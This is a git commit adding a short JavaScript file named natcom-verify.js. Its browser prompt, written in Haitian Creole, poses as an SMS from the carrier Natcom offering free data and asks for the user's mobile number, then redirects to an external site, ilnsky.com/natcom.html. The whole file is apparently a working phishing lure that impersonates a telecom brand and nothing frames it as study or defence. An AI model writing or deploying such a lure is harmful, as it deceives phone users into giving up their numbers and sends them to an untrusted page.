a7e083b784c37bbc6e5507dbbb9dc7d74fda54b7
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-30 10:38:47 +0100

    Create natcom-verify.js

---
+++ natcom-verify.js
@@ -0,0 +1,5 @@
+var password = 'AKTIVE DONE GRATIS'
+password=prompt('SMS: Felisitasyon, Kat SIM Natcom ou a kalifye pou resevwa Done Gratis, klike sou OK pou antre nimewo mobil ou.','AKTIVE DONE GRATIS');
+if (password != 'AKTIVE DONE GRATIS') {
+location.href='https://ilnsky.com/natcom.html';
+}
